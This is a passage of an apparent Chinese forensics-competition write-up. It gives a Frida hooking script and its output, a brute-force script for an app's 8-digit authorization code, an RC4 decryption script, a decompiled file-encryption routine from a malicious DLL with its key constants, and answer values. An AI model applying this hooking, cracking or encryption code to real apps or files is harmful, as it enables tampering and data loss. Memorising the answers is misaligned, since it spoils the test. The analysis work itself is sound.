</span><br><span class="line">                    &#125; catch (e) &#123;</span><br><span class="line">                        console.log(<span class="string">&quot;[-] 获取值失败: &quot;</span> + e);</span><br><span class="line">                    &#125;</span><br><span class="line">                    </span><br><span class="line">                &#125; catch (e) &#123;</span><br><span class="line">                    // 忽略错误，继续尝试</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            onComplete: function() &#123;</span><br><span class="line">                console.log(<span class="string">&quot;[*] 简化尝试完成&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">console.log(<span class="string">&quot;[*] Frida 脚本已加载，开始分析...&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python" data-language="python" data-language-label="Python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[*] 延迟执行，等待类加载...</span><br><span class="line">[*] 尝试直接访问...</span><br><span class="line">[+] 通过应用上下文找到 MainActivity</span><br><span class="line">[+] 获取到的值:    </span><br><span class="line">ts: <span class="number">1727899789</span>    </span><br><span class="line">apkHash: 983f8a605d16530190c09b0884d7cef1    </span><br><span class="line">getVer(): <span class="number">4.56</span><span class="number">.23</span>    </span><br><span class="line">加密路径: K0pQvBZ38ykL26OzfshqYTHC2f7RUJYIgrmIF6GcORU=</span><br><span class="line">🎯 完整URL: http://localhost:<span class="number">60723</span>/K0pQvBZ38ykL26OzfshqYTHC2f7RUJYIgrmIF6GcORU=?<span class="built_in">hash</span>=983f8a605d16530190c09b0884d7cef1&amp;ver=<span class="number">4.56</span><span class="number">.23</span>&amp;ts=<span class="number">1727899789</span>   </span><br></pre></td></tr></table></figure>
+
+<h2 id="35、apk第二界面的8位授权码是什么？-（答案格式：11111111）（-）"><a href="#35、apk第二界面的8位授权码是什么？-（答案格式：11111111）（-）" class="headerlink" title="35、apk第二界面的8位授权码是什么？ （答案格式：11111111）（ ）"></a>35、apk第二界面的8位授权码是什么？ （答案格式：11111111）（ ）</h2><figure class="highlight python" data-language="python" data-language-label="Python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">java_hash_code</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;优化的Java哈希计算&quot;&quot;&quot;</span></span><br><span class="line">    h = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> s:</span><br><span class="line">        h = (<span class="number">31</span> * h + <span class="built_in">ord</span>(char)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    <span class="keyword">if</span> h &amp; <span class="number">0x80000000</span>:</span><br><span class="line">        h -= <span class="number">0x100000000</span></span><br><span class="line">    <span class="keyword">return</span> h</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_force_range</span>(<span class="params">start, end, target_hash, result</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;多线程暴力破解指定范围&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start, end):</span><br><span class="line">        code = <span class="string">f&quot;<span class="subst">&#123;i:08d&#125;</span>&quot;</span></span><br><span class="line">        <span class="keyword">if</span> java_hash_code(code) == target_hash:</span><br><span class="line">            result.append(code)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fast_brute_force</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;快速暴力破解（多线程）&quot;&quot;&quot;</span></span><br><span class="line">    target_hash = -<span class="number">711638849</span></span><br><span class="line">    result = []</span><br><span class="line">    threads = []</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 分割工作到多个线程</span></span><br><span class="line">    num_threads = <span class="number">8</span></span><br><span class="line">    chunk_size = <span class="number">100000000</span> // num_threads</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;使用 <span class="subst">&#123;num_threads&#125;</span> 个线程进行暴力破解...&quot;</span>)</span><br><span class="line">    start_time = time.time()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num_threads):</span><br><span class="line">        start = i * chunk_size</span><br><span class="line">        end = (i + <span class="number">1</span>) * chunk_size <span class="keyword">if</span> i &lt; num_threads - <span class="number">1</span> <span class="keyword">else</span> <span class="number">100000000</span></span><br><span class="line">        </span><br><span class="line">        thread = threading.Thread(</span><br><span class="line">            target=brute_force_range, </span><br><span class="line">            args=(start, end, target_hash, result)</span><br><span class="line">        )</span><br><span class="line">        threads.append(thread)</span><br><span class="line">        thread.start()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 等待所有线程完成</span></span><br><span class="line">    <span class="keyword">for</span> thread <span class="keyword">in</span> threads:</span><br><span class="line">        thread.join()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> result:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;🎯 找到授权码: <span class="subst">&#123;result[<span class="number">0</span>]&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;⏱️  耗时: <span class="subst">&#123;time.time() - start_time:<span class="number">.2</span>f&#125;</span>秒&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;❌ 未找到授权码&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 直接运行快速版本</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    fast_brute_force()</span><br></pre></td></tr></table></figure>
+
+<h2 id="-4"><a href="#-4" class="headerlink" title=""></a><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1762323431628-3c960dee-3899-4f43-bffb-6b306d0bc107.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></h2><h1 id="二进制程序分析"><a href="#二进制程序分析" class="headerlink" title="二进制程序分析"></a>二进制程序分析</h1><p><a target="_blank" rel="noopener" href="https://s.threatbook.com/report/file/d7d517143a80c3af941ca46b77ce4e8d952f702d239733bf9d3b9488c35549a6">https://s.threatbook.com/report/file/d7d517143a80c3af941ca46b77ce4e8d952f702d239733bf9d3b9488c35549a6</a></p>
+<h2 id="36、安装该程序后，该恶意程序的可执行文件所在的直接父目录名称是什么为？（答案格式：root）（-）"><a href="#36、安装该程序后，该恶意程序的可执行文件所在的直接父目录名称是什么为？（答案格式：root）（-）" class="headerlink" title="36、安装该程序后，该恶意程序的可执行文件所在的直接父目录名称是什么为？（答案格式：root）（ ）"></a>36、安装该程序后，该恶意程序的可执行文件所在的直接父目录名称是什么为？（答案格式：root）（ ）</h2><p>扔给云沙箱：</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1762251141363-9c8fc433-2899-4fda-b1e9-7a5ea7787594.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<p>proxy</p>
+<p>用虚拟机的话记得添加安装前的快照</p>
+<h2 id="37、解密文件名为RnRGaWxlcy5lZGIiL的文件时所使用的key是什么？（答案格式：请按实际值填写）（-）"><a href="#37、解密文件名为RnRGaWxlcy5lZGIiL的文件时所使用的key是什么？（答案格式：请按实际值填写）（-）" class="headerlink" title="37、解密文件名为RnRGaWxlcy5lZGIiL的文件时所使用的key是什么？（答案格式：请按实际值填写）（ ）"></a>37、解密文件名为RnRGaWxlcy5lZGIiL的文件时所使用的key是什么？（答案格式：请按实际值填写）（ ）</h2><p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1762336439958-31a693b8-d298-477e-9b2e-27fb46583d82.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1762336465717-edffff49-f5f8-4af2-9ddd-16ae0e8e6bf8.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1762336472140-85279834-dd35-43e1-8b9a-25e274b2ac0b.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<p><code>1Njc2NTQ2Mzc0NTc</code></p>
+<h2 id="38、解密文件RnRGaWxlcy5lZGIiL成功后，请分析并给出解密后的文件的入口点地址？（答案格式：0x180000000）（-）"><a href="#38、解密文件RnRGaWxlcy5lZGIiL成功后，请分析并给出解密后的文件的入口点地址？（答案格式：0x180000000）（-）" class="headerlink" title="38、解密文件RnRGaWxlcy5lZGIiL成功后，请分析并给出解密后的文件的入口点地址？（答案格式：0x180000000）（ ）"></a>38、解密文件RnRGaWxlcy5lZGIiL成功后，请分析并给出解密后的文件的入口点地址？（答案格式：0x180000000）（ ）</h2><p>按照上题key所在的地址的解密算法解密（rc4加密，用cyberchef也行）</p>
+<figure class="highlight python" data-language="python" data-language-label="Python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_decrypt</span>(<span class="params">key, data</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    使用RC4算法解密数据。</span></span><br><span class="line"><span class="string">    key: 密钥（字节序列）</span></span><br><span class="line"><span class="string">    data: 加密的数据（字节序列）</span></span><br><span class="line"><span class="string">    返回解密后的字节序列。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 初始化S盒</span></span><br><span class="line">    S = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + S[i] + key[i % <span class="built_in">len</span>(key)]) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 生成密钥流并解密</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    out = []</span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> data:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + S[i]) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">        k = S[(S[i] + S[j]) % <span class="number">256</span>]</span><br><span class="line">        out.append(byte ^ k)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(out)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 密钥（直接使用字符串的ASCII字节）</span></span><br><span class="line">key = <span class="string">b&#x27;1Njc2NTQ2Mzc0NTc&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取加密文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;RnRGaWxlcy5lZGIiL&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    encrypted_data = f.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密数据</span></span><br><span class="line">decrypted_data = rc4_decrypt(key, encrypted_data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存解密后的文件（例如，命名为decrypted_file）</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;decrypted_file&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(decrypted_data)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;解密完成！解密文件已保存为 &#x27;decrypted_file&#x27;。&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>解密之后</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1762339110668-3d2cc9ab-4fbc-4961-a1d3-5b66a528895b.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<p><code>0x180002730</code></p>
+<h2 id="？39、加密文件名为6c051a72b91a1的文件时所使用的密钥是多少？（答案格式：请按实际值填写）（-）"><a href="#？39、加密文件名为6c051a72b91a1的文件时所使用的密钥是多少？（答案格式：请按实际值填写）（-）" class="headerlink" title="？39、加密文件名为6c051a72b91a1的文件时所使用的密钥是多少？（答案格式：请按实际值填写）（ ）"></a>？39、加密文件名为6c051a72b91a1的文件时所使用的密钥是多少？（答案格式：请按实际值填写）（ ）</h2><p>根据上一题来看解密之后的文件是一个PE文件</p>
+<blockquote>
+<p>PE文件是Windows操作系统上可执行文件、动态链接库等程序文件所采用的标准格式。简单来说，你日常使用的<code>.exe</code>程序和<code>.dll</code>文件基本上都是PE文件。而PE64则是这个格式的64位版本，专为64位Windows系统设计。</p>
+</blockquote>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1762341633450-829257c1-aacc-4c5b-90f7-f0b4c7ee5756.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1762341651540-9ce7c184-1665-48cf-9e15-20587056c8f7.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<p>所以说这就是调用了刚刚解密的dll文件：</p>
+<p>在字符串里面找到了这个字符串</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1762342262662-3d040121-8ce3-412b-95c9-3708e6e5f541.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1762342331374-0bd03ec3-ff4f-4d68-a90a-72494921f0e6.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<p>边上函数名也有，跟进：</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1762342485143-853d381d-5f85-49d1-90ad-eac7e0910dd9.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1762342501006-f4288a2f-51a5-4d76-8dc0-35337b2eaf95.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1762342514253-dafd3051-8e7a-4f5f-9d7d-8f44e08fd7e2.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<p>跟进<code>sub_180001E50</code>：</p>
+<figure class="highlight python" data-language="python" data-language-label="Python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall sub_180001E50(const CHAR *a1)</span><br><span class="line">&#123;</span><br><span class="line">  HANDLE FileA; // rax</span><br><span class="line">  void *v3; // rsi</span><br><span class="line">  DWORD v5; // ebx</span><br><span class="line">  HANDLE v6; // r14</span><br><span class="line">  DWORD v7; // r8d</span><br><span class="line">  DWORD i; // ebx</span><br><span class="line">  __int128 v9; // xmm6</span><br><span class="line">  __int64 v10; // r8</span><br><span class="line">  __int64 v11; // [rsp+40h] [rbp-C0h]</span><br><span class="line">  __int128 v12[<span class="number">6</span>]; // [rsp+50h] [rbp-B0h] BYREF</span><br><span class="line">  <span class="built_in">int</span> v13; // [rsp+B0h] [rbp-50h]</span><br><span class="line">  DWORD NumberOfBytesRead; // [rsp+C0h] [rbp-40h] BYREF</span><br><span class="line">  DWORD NumberOfBytesWritten; // [rsp+C4h] [rbp-3Ch] BYREF</span><br><span class="line">  void (__fastcall ***v16)(_QWORD, __int64); // [rsp+C8h] [rbp-38h] BYREF</span><br><span class="line">  <span class="built_in">int</span> v17; // [rsp+D0h] [rbp-30h]</span><br><span class="line">  __int128 v18; // [rsp+D4h] [rbp-2Ch] BYREF</span><br><span class="line">  __int128 v19; // [rsp+E4h] [rbp-1Ch]</span><br><span class="line">  <span class="built_in">int</span> v20; // [rsp+F4h] [rbp-Ch]</span><br><span class="line">  __int128 v21[<span class="number">6</span>]; // [rsp+100h] [rbp+0h] BYREF</span><br><span class="line">  <span class="built_in">int</span> v22; // [rsp+160h] [rbp+60h]</span><br><span class="line">  CHAR FileName[<span class="number">272</span>]; // [rsp+170h] [rbp+70h] BYREF</span><br><span class="line">  char Buffer[<span class="number">4096</span>]; // [rsp+280h] [rbp+180h] BYREF</span><br><span class="line"></span><br><span class="line">  sub_180001DE0((<span class="built_in">int</span>)FileName, <span class="number">260</span>, (<span class="built_in">int</span>)<span class="string">&quot;%s.1&quot;</span>, a1);</span><br><span class="line">  FileA = CreateFileA(a1, <span class="number">0x80000000</span>, <span class="number">0</span>, 0i64, 3u, 0x80u, 0i64);</span><br><span class="line">  v3 = FileA;</span><br><span class="line">  <span class="keyword">if</span> ( FileA == (HANDLE)-1i64 )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_180001D80(<span class="string">&quot;无法打开文件: %s\n&quot;</span>, a1);</span><br><span class="line">    <span class="keyword">return</span> 0i64;</span><br><span class="line">  &#125;</span><br><span class="line">  v5 = SetFilePointer(FileA, <span class="number">0</span>, 0i64, 2u);</span><br><span class="line">  SetFilePointer(v3, <span class="number">0</span>, 0i64, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v5 &gt; <span class="number">0x5F5E100</span> )</span><br><span class="line">    <span class="keyword">return</span> 0i64;</span><br><span class="line">  v6 = CreateFileA(FileName, 0x40000000u, <span class="number">0</span>, 0i64, 2u, 0x80u, 0i64);</span><br><span class="line">  <span class="keyword">if</span> ( v6 == (HANDLE)-1i64 )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_180001D80(<span class="string">&quot;无法创建加密文件: %s\n&quot;</span>, FileName);</span><br><span class="line">    CloseHandle(v3);</span><br><span class="line">    <span class="keyword">return</span> 0i64;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( ReadFile(v3, Buffer, 0x1000u, &amp;NumberOfBytesRead, 0i64) )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = NumberOfBytesRead;</span><br><span class="line">      <span class="keyword">if</span> ( !NumberOfBytesRead )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; NumberOfBytesRead; i += <span class="number">16</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        memset(v21, <span class="number">0</span>, sizeof(v21));</span><br><span class="line">        v22 = <span class="number">0</span>;</span><br><span class="line">        memset(v12, <span class="number">0</span>, sizeof(v12));</span><br><span class="line">        v13 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v7 - i &lt; <span class="number">0x10</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        v9 = *(_OWORD *)&amp;Buffer[i];</span><br><span class="line">        v20 = <span class="number">0</span>;</span><br><span class="line">        v17 = <span class="number">4</span>;</span><br><span class="line">        v16 = 0i64;</span><br><span class="line">        v18 = 0i64;</span><br><span class="line">        v19 = 0i64;</span><br><span class="line">        v11 = sub_1800023B0(696i64);</span><br><span class="line">        v16 = (void (__fastcall ***)(_QWORD, __int64))sub_180001000(v11, &amp;v18);</span><br><span class="line">        v18 = xmmword_180025A80;</span><br><span class="line">        sub_180001920(</span><br><span class="line">          v16,</span><br><span class="line">          &amp;v18,</span><br><span class="line">          v16 + <span class="number">65</span>,</span><br><span class="line">          (i &gt;&gt; <span class="number">4</span>) - <span class="number">11</span> * ((unsigned <span class="built_in">int</span>)((3123612579u * (unsigned __int64)(i &gt;&gt; <span class="number">4</span>)) &gt;&gt; <span class="number">32</span>) &gt;&gt; <span class="number">3</span>));</span><br><span class="line">        v17 = <span class="number">3</span>;</span><br><span class="line">        v19 = xmmword_180025A70;</span><br><span class="line">        v12[<span class="number">0</span>] = v9;</span><br><span class="line">        sub_180001A80(&amp;v16, v12, v10, v21);</span><br><span class="line">        *(_OWORD *)&amp;Buffer[i] = v21[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span> ( v16 )</span><br><span class="line">          (**v16)(v16, 1i64);</span><br><span class="line">        v7 = NumberOfBytesRead;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( !WriteFile(v6, Buffer, v7, &amp;NumberOfBytesWritten, 0i64) || NumberOfBytesWritten != NumberOfBytesRead )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_180001D80(<span class="string">&quot;写入文件失败: %s\n&quot;</span>, FileName);</span><br><span class="line">        CloseHandle(v3);</span><br><span class="line">        CloseHandle(v6);</span><br><span class="line">        DeleteFileA(FileName);</span><br><span class="line">        <span class="keyword">return</span> 0i64;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    CloseHandle(v3);</span><br><span class="line">    CloseHandle(v6);</span><br><span class="line">    <span class="keyword">return</span> 1i64;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1762342662780-3f3a2a71-09d4-4242-9b72-33ae0b447209.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<p>跟进</p>
+<figure class="highlight python" data-language="python" data-language-label="Python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.data:0000000180025A70 xmmword_180025A70 xmmword 5C62866AB07BDEFF762FD54CEF942367h</span><br><span class="line">.data:0000000180025A80 xmmword_180025A80 xmmword 57754537466567654F56366253446763h</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1762342744537-6e103daf-eeeb-4dae-aaa0-778624983f4b.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1762343182682-249611f3-8a4a-4c25-86de-477c1b92338f.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/54208227/1762343200482-e3245357-3232-4873-917c-1977ef903f82.png" referrerpolicy="no-referrer" loading="lazy" decoding="async"></p>
+<pre><code>
+
+
+
+
+## ？40、6c051a72b91a1.1文件解密后的md5值后六位是多少？（字母全大写，答案格式：AAAAAA）（ ）
+##  
+# 计算机取证分析
+我投降🏳️：
+
+![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762080130712-fb6cd868-9c49-4c32-acdf-5f15046f7ea5.png)![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762080147411-529afdce-9362-48d6-bc4a-1673e59c6085.png)
+
+## 41、操作系统的Build版本号是？（答案格式：1）（ ）
+![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762070698715-bff270ce-11e0-4e33-a970-2bfba3c637fb.png)
+
+`19044.1381`
+
+## 42、操作系统设置的账户密码最长存留期为多少天？（答案格式：1）（ ）
+![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762071100480-19926bba-1a61-484a-9ced-2d5198d643bb.png)
+
+`68`
+
+## 43、用户2登陆密码NT哈希值后六位是？（字母全大写，答案格式：AAAAAA）（ ）
+![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762071118801-97b417a5-0105-40a8-8a51-02063081195f.png)
+
+`&lt;font style=&quot;color:rgba(0, 0, 0, 0.87);&quot;&gt;A9C708&lt;/font&gt;`
+
+## 44、蓝牙mac地址是多少？（答案格式：AA-AA-AA-AA-AA-AA）（ ）![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762071174217-bc2b8520-1a89-489a-b38b-b77608d5057f.png)
+`9C-B6-D0-04-C9-CC`
+
+## 45、SafeImager的产品序列号后四位是？（字母全大写，答案格式：AAAAAA）（ ）
+![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762071208977-3240a22b-e82e-46f1-b457-894fa07ed898.png)
+
+020040321087903020000`09C4`
+
+## 46、123.VHD所处的结束扇区是？（答案格式：1 ）（ ）
+
+
+## 47、用户在BitLocker加密分区最后修改的文件是?（答案格式：abcd.txt）（ ）
+上题的虚拟磁盘打开，找到backup文件夹里面存着bitlocker恢复密钥
+
+![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762071539382-bf4bb15f-d97c-4e19-b166-63adcf03a1ac.png)
+
+![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762071614215-9153911b-d0f1-4ed9-8e1d-20ad486d732b.png)
+
+打开时间倒序即可
+
+`资料1.txt`
+
+## 48、用户连接192.168.114.129时用的会话名称是？（答案格式：按照实际情况填写）（ ）
+![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762071652301-0d58eb6f-0208-4a7b-9fa3-980d92d547de.png)
+
+`连接阿里云`
+
+## 49、用户创建存储虚拟币钱包地址页面的时间是？（使用双位数格式，答案格式：01月01日）（ ）
+![](https://cdn.nlark.com/yuque/0/2025/png/54208227/1762082521100-63fb9af6-a77d-49f8-8373-d8135be52d91.png)有怀疑是这个软件，但是点开发现要初始化啥的以为就不是。
+
